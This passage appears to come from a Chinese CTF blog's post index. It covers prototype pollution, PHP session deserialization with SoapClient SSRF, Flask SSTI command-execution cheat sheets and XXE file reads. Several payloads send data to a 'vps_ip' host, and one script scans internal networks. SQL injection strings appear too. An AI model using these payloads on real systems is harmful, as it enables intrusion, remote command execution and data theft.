a2enmod rewriteCOPY sql.sql /tmp/sql.sqlCOPY run.sh /run.shRUN mkdir /home/nu1lctfCOPY clean_danger.sh /home/nu1lctf/clean_danger.shRUN chmod +x /run.shRUN chmod 777 /tmp/sql.sqlRUN chmod 555 /home/nu1lctf/clean_danger.shEXPOSE 80CMD [\"/run.sh\"] 读取.sh文件12345clean_danger.shcd /app/adminpic/ rm *.jpgrun.sh#!/bin/bash chown www-data:www-data /app -R if [ \"$ALLOW_OVERRIDE\" = \"**False**\" ]; then unset ALLOW_OVERRIDE else sed -i \"s/AllowOverride None/AllowOverride All/g\" /etc/apache2/apache2.conf a2enmod rewrite fi # initialize database mysqld_safe --skip-grant-tables&amp; sleep 5 ## change root password mysql -uroot -e \"use mysql;UPDATE user SET password=PASSWORD('Nu1Lctf%#~:p') WHERE user='root';FLUSH PRIVILEGES;\" ## restart mysql service mysql restart ## execute sql file mysql -uroot -pNu1Lctf\\%\\#\\~\\:p &lt; /tmp/sql.sql ## crontab (while true;do rm -rf /tmp/*;sleep 2;done)&amp; ## rm sql cd /tmp/ rm sql.sql source /etc/apache2/envvars tail -F /var/log/apache2/* &amp; exec apache2 -D FOREGROUND 可以看到有数据库密码，登录进后台就能拿到flag了","comments":true,"permalink":"https://xi4or0uji.github.io/2019/01/20/n1ctf-writeup/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"javascript原型链污染","date":"2019-01-17T16:00:00.000Z","path":"2019/01/18/javascript原型链污染/","text":"前几天大佬们培训讲到了一个没怎么听过的东西，记一记做个笔记。 原型对象介绍肉鸡只是一个小后台，对于前端真的不怎么会，先介绍一哈在javascript里面只有一种结构，那就是对象，每个对象都会有一个原型对象，每个原型对象引申出其对应的原型对象，经过一层层的调用，就形成了原型链。这句话讲得有点难懂，肉鸡大概理解下，可以理解成每个类都有父类，父类下面又会有子类，一层层调用过去其实就是他说的原型链的过程。实例的对象可以通过__proto__去访问它的原型对象。原型对象的重点是null。 原型链污染小演示可以看到字符b的indexof方法被赋值以后，字符a调用indexof方法的时候，也会是123。 实例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110const express = require('express')var hbs = require('hbs');var bodyParser = require('body-parser');const md5 = require('md5');var morganBody = require('morgan-body');const app = express();var user = []; //empty for nowvar matrix = [];for (var i = 0; i &lt; 3; i++)&#123; matrix[i] = [null , null, null];&#125;function draw(mat) &#123; var count = 0; for (var i = 0; i &lt; 3; i++)&#123; for (var j = 0; j &lt; 3; j++)&#123; if (matrix[i][j] !== null)&#123; count += 1; &#125; &#125; &#125; return count === 9;&#125;app.use(express.static('public'));app.use(bodyParser.json());app.set('view engine', 'html');morganBody(app);app.engine('html', require('hbs').__express);app.get('/', (req, res) =&gt; &#123; for (var i = 0; i &lt; 3; i++)&#123; matrix[i] = [null , null, null]; &#125; res.render('index');&#125;)app.get('/admin', (req, res) =&gt; &#123; /*this is under development I guess ??*/ console.log(user.admintoken); if(user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken)&#123; res.send('Hey admin your flag is &lt;b&gt;flag&#123;prototype_pollution_is_very_dangerous&#125;&lt;/b&gt;'); &#125; else &#123; res.status(403).send('Forbidden'); &#125; &#125;)app.post('/api', (req, res) =&gt; &#123; var client = req.body; var winner = null; if (client.row &gt; 3 || client.col &gt; 3)&#123; client.row %= 3; client.col %= 3; &#125; matrix[client.row][client.col] = client.data; for(var i = 0; i &lt; 3; i++)&#123; if (matrix[i][0] === matrix[i][1] &amp;&amp; matrix[i][1] === matrix[i][2] )&#123; if (matrix[i][0] === 'X') &#123; winner = 1; &#125; else if(matrix[i][0] === 'O') &#123; winner = 2; &#125; &#125; if (matrix[0][i] === matrix[1][i] &amp;&amp; matrix[1][i] === matrix[2][i])&#123; if (matrix[0][i] === 'X') &#123; winner = 1; &#125; else if(matrix[0][i] === 'O') &#123; winner = 2; &#125; &#125; &#125; if (matrix[0][0] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][2] &amp;&amp; matrix[0][0] === 'X')&#123; winner = 1; &#125; if (matrix[0][0] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][2] &amp;&amp; matrix[0][0] === 'O')&#123; winner = 2; &#125; if (matrix[0][2] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][0] &amp;&amp; matrix[2][0] === 'X')&#123; winner = 1; &#125; if (matrix[0][2] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][0] &amp;&amp; matrix[2][0] === 'O')&#123; winner = 2; &#125; if (draw(matrix) &amp;&amp; winner === null)&#123; res.send(JSON.stringify(&#123;winner: 0&#125;)) &#125; else if (winner !== null) &#123; res.send(JSON.stringify(&#123;winner: winner&#125;)) &#125; else &#123; res.send(JSON.stringify(&#123;winner: -1&#125;)) &#125;&#125;)app.listen(3000, () =&gt; &#123; console.log('app listening on port 3000!')&#125;) 可以看到，想要拿到flag要满足1user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken 但是admintoken不知道是什么，我们还能看到这一句1matrix[client.row][client.col] = client.data; 同时也知道user是个数组，恰好client是用户可控的，因此我们就可以利用matrix去完成污染。脚本，其实截包发包也行1234567891011121314151617# -*- coding:utf8 -*-import requestsimport jsonheaders = &#123; 'Content-Type': 'application/json'&#125;data = &#123; 'row': '__proto__', 'col': 'admintoken', 'data': 'xiaorouji'&#125;myd = requests.session()url = \"http://example.cn/api\"url2 = \"http://example.cn/admin?querytoken=f25758d1dec0c49eb22049d3080e87d0\"myd.post(url, headers=headers, data=json.dumps(data))print myd.get(url2).content 然后就能有flag了","comments":true,"permalink":"https://xi4or0uji.github.io/2019/01/18/javascript原型链污染/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://xi4or0uji.github.io/tags/javascript/"}]},{"title":"lctf babyphp's revenge","date":"2019-01-15T16:00:00.000Z","path":"2019/01/16/lctf-babyphps-revenge/","text":"题目源码很短，就几行1234567891011121314151617181920index.php&lt;?phphighlight_file(__FILE__);$b = 'implode';call_user_func($_GET['f'],$_POST);session_start();if(isset($_GET['name']))&#123; $_SESSION['name'] = $_GET['name'];&#125;var_dump($_SESSION);$a = array(reset($_SESSION),'welcome_to_the_lctf2018');call_user_func($b,$a);flag.php&lt;?phpsession_start();echo 'only localhost can get flag!';$flag = 'LCTF&#123;******************&#125;';if($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\")&#123;$_SESSION['flag'] = $flag;&#125; 这题有个call_user_func函数，最好的情况下是先进行变量覆盖，将$b覆盖成unserialize，然后下一个call_user_func再去调用去进行利用，但是$a是数组，比较难进行利用，可是题目给出的flag文件可以猜测应该是利用反序列化去触发ssrf，只是我们找不到一个可以利用的类，所以现在的问题就是要先找一个可以进行利用的类。我们可以看到，两个文件的session都开了，所以其实这里隐藏了php session的反序列化机制问题，通过session去进行反序列化的利用。 php session反序列化机制在php.ini中存在着session.serialize_handler的配置，用来定义序列化处理的处理器的名字，默认使用的是php。如果序列化和反序列化的引擎选择不一样，当使用php引擎的时候，php引擎会以|作为key和value的分隔，继续对value进行反序列化，由此达成触发反序列化的目的。具体看这个 https://blog.spoock.com/2016/10/16/php-serialize-problem/ SOAP的利用SOAP是webservice的三要素（soap，WSDL，UDDI）之一，WSDL用来描述如何访问具体的接口，UDDI用来管理、分发、查询webservice，SOAP可以和现存的许多因特网协议和格式结合使用。简单的说，SOAP是连接在web服务和web客户端之间的接口。它采用http作为底层通讯协议，xml作为数据传送的格式。soap消息基本上是从发送端到接收端的单向传输，但他们常常结合起来执行类似于请求 / 应答的模式。我们先试一下最简单的用法123456&lt;?php$a = new SoapClient(null,array('location'=&gt;'http://vps_ip:2333 ','uri'=&gt;'123'));$b = serialize($a);echo $b;$c = unserialize($b);$c -&gt; a(); 同时，修改头部还能有crlf漏洞1234567891011121314&lt;?php$target = \"http://134.175.34.73:2333\";$post_string = 'data=abc';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=crk7lmeh2r9b960jlcdh88kvg4');$b = new SoapClient(null,array('location' =&gt; $target,'user_agent' =&gt; 'glarcy^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string,'uri'=&gt;'hello'));$aaa = serialize($b);$aaa = str_replace('^^',\"\\n\\r\",$aaa);echo urlencode($aaa);//echo $b;$d = unserialize($aaa);$d -&gt; b(); 回到题目因此这一题我们可以通过call_user_func去设置session.serialize_handler，然后用默认的引擎去触发反序列化。12345&lt;?php$target = 'http://127.0.0.1/ctf/soap/flag.php';$attack = new SoapClient(null,array('location'=&gt;$target,'user_agent'=&gt;\"glary\\r\\nCookie: PHPSESSID=crk7lmeh2r9b960jlcdh88kvg4\\r\\n\",'uri'=&gt;'123'));$payload = urlencode(serialize($attack));echo $payload; 注意要在payload前加一个|，这样就能使它对payload反序列化。此时，我们的payload已经存进去session了，接下来就是要去触发反序列化因为题目会将session的值var_dump出来，最后只需要将我们的session改成payload的session就行","comments":true,"permalink":"https://xi4or0uji.github.io/2019/01/16/lctf-babyphps-revenge/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"}]},{"title":"flask之ssti模板注入","date":"2019-01-14T16:00:00.000Z","path":"2019/01/15/flask之ssti模板注入/","text":"以前做题学过一些ssti，但是感觉不够深入，整理一下，算个总结吧 漏洞介绍ssti，服务器端模板注入，主要是python或者其他语言在渲染模板的时候，由于代码不规范或者信任了用户的输入，使得模板可控。简单来说就是，模板里面有些用户输入的东西，但是程序员在渲染模板的时候，没有检查用户输入的东西是不是都是善意的，于是就被用户拿下了这个模板做坏事了。举个栗子我们现在有这样一个模板，emmm，顺便说一句，模板其实就是一个html而已123&lt;html&gt;&lt;div&gt;&#123;$name&#125;&lt;/div&gt;&lt;/html&gt; 在这个模板上有一个name参数，用来存放用户的名字，因为每次打开页面我们都不确定是哪个用户打开。现在问题来了，如果这个参数是用户可控的，那么用户就有可能会在里面放一些恶意的代码，然后就有可能执行任意命令，这就是简单的ssti。 动手实践flask的搭建在学漏洞之前先学一下怎么搭建flask的，毕竟python web和php web还是有挺多区别的，phper枯了我们现在pycharm里面点击左上角的file，然后是new project，选flask，template language选jinja2，然后create就行这个时候我们可以看到新建出来的文件是这样的运行一下app.py会看到下面图片显示的东西，此时浏览器访问一下http://127.0.0.1:5000 就会看到有hello world显示出来 模板渲染12345|__app.py|__static| |__style.css|__templates |__index.html 模板是一个包含响应文本的文件，其中包含用占位变量表示的动态部分，其具体值只在请求的上下文中才能知道，使用真实值替换变量，再返回最终得到的响应字符串，这一过程成为渲染。简单来说，就是一个函数调用了某一个模板，那个模板展示出来，就是渲染。模板可以用render_template_string()方式去渲染，这个函数会将放在templates里面的对应的模板渲染出来 ssti模板注入解析好了，前面介绍了那么多，是时候来一题具体的实操了下面给出一份存在漏洞的代码12345678910111213141516171819from flask import Flaskfrom flask import requestfrom flask import render_template_stringapp = Flask(__name__)@app.route('/ssti',methods=['GET', 'POST'])def test(): template = ''' &lt;div class=\"center-content error\"&gt; &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt; ''' %(request.url) return render_template_string(template)if __name__ == '__main__': app.debug = True app.run() 可以看到，在这个代码里面，有个test函数，他会在页面找不到的时候，先输出that page doesn’t exist，然后再将用户请求的url渲染出来，因为对用户的url进行了二次渲染，所以，如果我们在url里面加入了恶意代码，他也是能渲染出来的 攻击知道了漏洞是怎样形成的，剩下的就是利用了在python中，object类是所有类的基类，如果定义一个类的时候没有指定是继承哪一个类的话，那它默认继承的是object类。我们在进行攻击的时候，虽然当前的类可能不能让我们进行很好的攻击，但是我们可以通过寻找其父类的其他子类，最后达到攻击的目的。我们先用pycharm来进行一下子类的寻找1234567891011121314151617181920212223242526272829303132333435363738394041#获得基类#python2.7''.__class__.__mro__[2]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[1]#python3.7''.__class__.__mro__[1]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[1]#python 2.7#文件操作#找到file类[].__class__.__bases__[0].__subclasses__()[40]#读文件[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()#写文件[].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')#命令执行#os执行[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()#eval,impoer等全局函数[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\")[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(\"__import__('os').popen('id').read()\")[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()#python3.7#命令执行&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;#文件操作&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;#windows下的os命令\"\".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read() 一些绕waf的姿势过滤[123#getitem、pop''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read() 过滤引号123456789#chr函数&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;#request对象&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd#命令执行&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id 过滤下划线1&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ 过滤花括号12#用&#123;%%&#125;标记&#123;% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %&#125;1&#123;% endif %&#125; 如果不能执行命令就用盲注的方式爆出来，脚本如下1234567891011121314151617181920212223&#123;% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %&#125;~p0~&#123;% endif %&#125;# -*- coding: utf-8 -*-import requestsurl = 'http://127.0.0.1:8080/'def check(payload): postdata = &#123; 'exploit':payload &#125; r = requests.post(url, data=postdata).content return '~p0~' in rpassword = ''s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"$\\'()*+,-./:;&lt;=&gt;?@[\\\\]^`&#123;|&#125;~\\'\"_%'for i in xrange(0,100): for c in s: payload = '&#123;% if \"\".__class__.__mro__[2].__subclasses__()[40](\"/tmp/test\").read()['+str(i)+':'+str(i+1)+'] == \"'+c+'\" %&#125;~p0~&#123;% endif %&#125;' if check(payload): password += c break print password 参考https://0day.work/jinja2-template-injection-filter-bypasses/https://juejin.im/entry/5a91040ef265da4e9268410e","comments":true,"permalink":"https://xi4or0uji.github.io/2019/01/15/flask之ssti模板注入/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"python","slug":"python","permalink":"https://xi4or0uji.github.io/tags/python/"}]},{"title":"xxe漏洞攻击与防御","date":"2018-11-28T16:00:00.000Z","path":"2018/11/29/xxe漏洞攻击与防御/","text":"最近在学xxe，当做个笔记好了 XML讲xxe之前先讲xml，毕竟xml是基础。xml是个神奇的东西，用来传输和存储数据，你可以理解成类似sql在数据库拿东西一样，xml也是一个可以拿东西的玩意儿。但是它注重数据的内容：它说明数据是什么，以及携带的数据信息。 XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素12345678910111213141516171819&lt;!--xml声明--&gt;&lt;?xml version=\"1.0\"?&gt;&lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档时候note类型的文档--&gt;&lt;!ELEMENT note (to,from,head,body)&gt; &lt;!--定义note包含四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为“#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为“#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为“#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为“#PCDATA”类型--&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;David&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;a mail&lt;/head&gt;&lt;body&gt;hello David!&lt;/body&gt;&lt;/note&gt; DTDDTD，也就是文档类型定义，可以定义合法的XML文档构建模块，使用一系列合法的元素来定义文档的结构，既可内部引用，也可外部引用。 内部声明DTD1&lt;!DOCTYPE 根元素 [元素声明]&gt; 引用外部DTD12&lt;!DOCTYPE 根元素 system \"文件名\"&gt;&lt;!DOCTYPE 根元素 PUBLIC “public_id” \"文件名\"&gt; 其他重要的内容DOCTYPE （DTD的声明）ENTITY （实体的声明）SYSTEM、PUBLIC （外部资源的声明） 实体实体类似于变量，但是必须在DTD里面声明，可以在文档中的其他位置引用该变量。分四种：内置实体 （Built-in entities）字符实体 （Character entitties）通用实体 （General entitites）参数实体 （Parameter entitites）还可以分为内部实体和外部实体，参数实体用%实体名称申明，引用时也用%实体名称；其余实体直接用实体名称申明，引用时用&amp;实体名称。参数实体只能在DTD中申明，DTD中引用；其余实体只能是在DTD中申明，可在xml文档中引用。 内部实体1&lt;!ENTITY 实体名称 \"实体的值\"&gt; 外部实体1&lt;!ENTITY 实体名称 SYSTEM \"URI\"&gt; 参数实体12&lt;!ENTITY % 实体名称 \"实体的值\"&gt;&lt;!ENTITY % 实体名称 SYSYTEM \"URI\"&gt; 非参数实体+内部实体1234567&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY name \"rouji\"&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;name;&lt;/value&gt;&lt;/foo&gt; 参数实体+内部实体12345&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % name SYSTEM \"file:///etc/passwd\"&gt; %name;]&gt; 当然除了file协议去读敏感文件，还有其他的协议可以利用 攻击好的，前面的一堆铺垫相信大家隐隐约约感觉到了什么，嘻嘻，现在开始利用啦 最简单的利用：有回显的xxexml.php代码1234567&lt;?phplibxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$res = simplexml_import_dom($dom);echo $res; 可以看到，后台没有开启libxml_disable_entity_loader同时也没有什么waf，这就让我们可以更加方便地xxe打过去了payload12345&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE name [&lt;!ENTITY roujiji SYSTEM \"file:///d:/xmapp/htdocs/ctf/xxe/123.txt\"&gt;]&gt;&lt;name&gt;&amp;roujiji;&lt;/name&gt; 这个文件很友好，没有什么特殊符号，但是如果文件里面包含着很多尖括号等特殊符号那就gg了，我们记得xml是注重数据的内容的，所以遇上他们是会报错的鸭 读取有特殊符号的文件编码绕过这个时候我们可以对他进行base64编码12345&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE name [&lt;!ENTITY roujiji SYSTEM \"php://filter/read=convert.base64-encode/resource=d:/xmapp/htdocs/ctf/xxe/234.txt\"&gt;]&gt;&lt;name&gt;&amp;roujiji;&lt;/name&gt; CDATA绕过CDATA中所有的字符都会被当做元素字符数据的常量部分而不是xml标记，也是这样，我们就可以输出特殊字符了payload12345678&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE name [&lt;!ENTITY % start \"&lt;![CDATA[\"&gt; &lt;!ENTITY % roujiji SYSTEM \"file:///d:/xmapp/htdocs/ctf/xxe/234.txt\"&gt; &lt;!ENTITY % end \"]]&gt;\"&gt; &lt;!ENTITY % dtd SYSTEM \"http://vps_ip/evil.dtd\"&gt; %dtd; ]&gt; &lt;name&gt;&amp;all;&lt;/name&gt; evil.dtd12&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!ENTITY all \"%start;%roujiji;%end;\"&gt; 可以看到，确实是可以将特殊字符也显示出来了 难一点点的无回显的xxe（Blind OOB XXE）有回显是最美好的，但是很多时候没有回显的情况会更加常见，假如上面xml.php的代码去掉echo那一行，我们又要怎么利用呢？举个栗子，xml文件变成了这样的12345&lt;?phplibxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 文件的内容不能直接在网页显示，那我们可不可以将它打到自己的服务器上面呢payload1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM \"http://vps_ip/ctf/xxe/test.dtd\"&gt;%remote;%int;%send;]&gt; test.dtd12&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///D:/twings.txt\"&gt;&lt;!ENTITY % int \"&lt;!ENTITY &amp;#37; send SYSTEM 'http://vps_ip:2333?p=%file;'&gt;\"&gt; 最后vps再监听一下端口 http内网主机探测想象一下，既然我们可以利用它完成类似ssrf一样的操作去读文件，那其实访问服务器也是可以的鸭，而且靶机可以解析我们传上去的xml，如果我们将ip遍历一次，不就可以得到内网里面的主机的信息了吗123456789101112131415161718192021222324252627import requestsimport base64def build_xml(string): xml = \"\"\"&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\"\"\" xml += \"\\r\\n\" + \"\"\"&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;\"\"\" xml += \"\\r\\n\" + \"\"\"&lt;!ENTITY xxe SYSTEM \"\"\" + '\"' + string + '\"' + \"\"\"&gt;]&gt;\"\"\" xml += \"\\r\\n\" + \"\"\"&lt;xml&gt;\"\"\" xml += \"\\r\\n\" + \"\"\" &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;\"\"\" xml += \"\\r\\n\" + \"\"\"&lt;/xml&gt;\"\"\" send_xml(xml)def send_xml(xml): headers = &#123;'Content-Type': 'application/xml'&#125; x = requests.post('http://vps_ip/ctf/xxe/xml1.php', data=xml, headers=headers, timeout=5).text coded_string = x.split(' ')[-2] print(coded_string)for i in range(1,255): try: i = str(i) ip = \"100.100.100.\" + i string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/' print(string) build_xml(string) except: continue 支持，我们就可以探测到所有主机的信息了 http内网主机端口扫描同样的道理，我们也可以遍历一次主机的所有端口，用burp跑一下就行了 文件上传利用这个利用一般会在java方面比较多，就是jar协议的利用首先我们先了解一下jar协议 jar://jar文件url语法：12jar:&#123;url&#125;!/&#123;entry&#125;url是文件的路径，entry是想要解压出来的文件 jar处理文件的过程：1、下载需要处理的文件到临时文件中2、提取出我们想要的文件3、删除临时文件可以看到，jar处理文件是会生成临时文件的，那样我们怎么去找到那个临时文件并且进行利用呢先来个本地测试java代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import java.io.File;import javax.xml.parsers.DocumentBuilder;import javax.xml.parsers.DocumentBuilderFactory;import org.w3c.dom.Attr;import org.w3c.dom.Comment;import org.w3c.dom.Document;import org.w3c.dom.Element;import org.w3c.dom.NamedNodeMap;import org.w3c.dom.Node;import org.w3c.dom.NodeList;/** * 使用递归解析给定的任意一个xml文档并且将其内容输出到命令行上 */public class xml_test&#123; public static void main(String[] args) throws Exception&#123; DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); Document doc = db.parse(new File(\"src/student.xml\")); //获得根元素结点 Element root = doc.getDocumentElement(); parseElement(root); &#125; private static void parseElement(Element element)&#123; String tagName = element.getNodeName(); NodeList children = element.getChildNodes(); System.out.print(\"&lt;\" + tagName); //element元素的所有属性所构成的NamedNodeMap对象，需要对其进行判断 NamedNodeMap map = element.getAttributes(); //如果该元素存在属性 if(null != map)&#123; for(int i = 0; i &lt; map.getLength(); i++)&#123; //获得该元素的每一个属性 Attr attr = (Attr)map.item(i); String attrName = attr.getName(); String attrValue = attr.getValue(); System.out.print(\" \" + attrName + \"=\\\"\" + attrValue + \"\\\"\"); &#125; &#125; System.out.print(\"&gt;\"); for(int i = 0; i &lt; children.getLength(); i++)&#123; Node node = children.item(i); //获得结点的类型 short nodeType = node.getNodeType(); if(nodeType == Node.ELEMENT_NODE)&#123; //是元素，继续递归 parseElement((Element)node); &#125; else if(nodeType == Node.TEXT_NODE)&#123; //递归出口 System.out.print(node.getNodeValue()); &#125; else if(nodeType == Node.COMMENT_NODE)&#123; System.out.print(\"&lt;!--\"); Comment comment = (Comment)node; //注释内容 String data = comment.getData(); System.out.print(data); System.out.print(\"--&gt;\"); &#125; &#125; System.out.print(\"&lt;/\" + tagName + \"&gt;\"); &#125;&#125; student.xml的内容1234&lt;!DOCTYPE convert [&lt;!ENTITY remote SYSTEM \"jar:http://localhost:9999/jar.zip!/1.php\"&gt;]&gt;&lt;convert&gt;&amp;remote;&lt;/convert&gt; python服务器123456789101112131415161718192021222324252627282930313233343536373839404142import sysimport timeimport threadingimport socketserverfrom urllib.parse import quoteimport http.client as httpclisten_host = 'localhost'listen_port = 9999jar_file = sys.argv[1]class JarRequestHandler(socketserver.BaseRequestHandler): def handle(self): http_req = b'' print('New connection:',self.client_address) while b'\\r\\n\\r\\n' not in http_req: try: http_req += self.request.recv(4096) print('Client req:\\r\\n',http_req.decode()) jf = open(jar_file, 'rb') contents = jf.read() headers = ('''HTTP/1.0 200 OK\\r\\n''' '''Content-Type: application/java-archive\\r\\n\\r\\n''') self.request.sendall(headers.encode('ascii')) self.request.sendall(contents[:-1]) time.sleep(30) print(30) self.request.sendall(contents[-1:]) except Exception as e: print (\"get error at:\"+str(e))if __name__ == '__main__': jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) print ('waiting for connection...') server_thread = threading.Thread(target=jarserver.serve_forever) server_thread.daemon = True server_thread.start() server_thread.join() 我们先运行python服务器脚本，让其进行监听然后再运行java脚本，可以看到报了个错，因为student.xml里面的jar.zip包里是没有1.php文件的，找不到自然就会报错然后这个时候我们去找报错的文件路径，就可以看到那个临时文件了既然能有临时文件，剩下的就是想办法让临时文件留的久一点进行操作了我们可以让python的延时长一点，不仅仅是30s，同时，也可以将传上去的文件先最后加一个垃圾字符，然后在传到最后一秒的时候，停住不动，这样实际上已经传完了，但是服务器以为没传完而已，剩下的进行文件替换就行","comments":true,"permalink":"https://xi4or0uji.github.io/2018/11/29/xxe漏洞攻击与防御/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"xxe","slug":"xxe","permalink":"https://xi4or0uji.github.io/tags/xxe/"}]},{"title":"2018高校运维赛wp","date":"2018-11-17T16:00:00.000Z","path":"2018/11/18/2018高校运维赛wp/","text":"Simple BBS登录处没有过滤单引号，且没有报错信息，利用报错注入注出flag1admin'union select (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables),0x7e)))# 尝试一下读一下flag，发现限制了长度，利用substr进行读取1admin'union select (extractvalue(1,substr((select flag from flag),20,40),0x7e)))# Simple Blog题目提示了一下是二次注入和文件包含漏洞，尝试一下正常的访问，答题以后分数是会进行计算然后正常显示的注册一个用户名为lll’的用户进行答题，发现分数会一直都是0，所以二次注入的点应该是在这里利用exp进行报错盲注1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# -*- coding:utf8 -*-import requestsregister_url 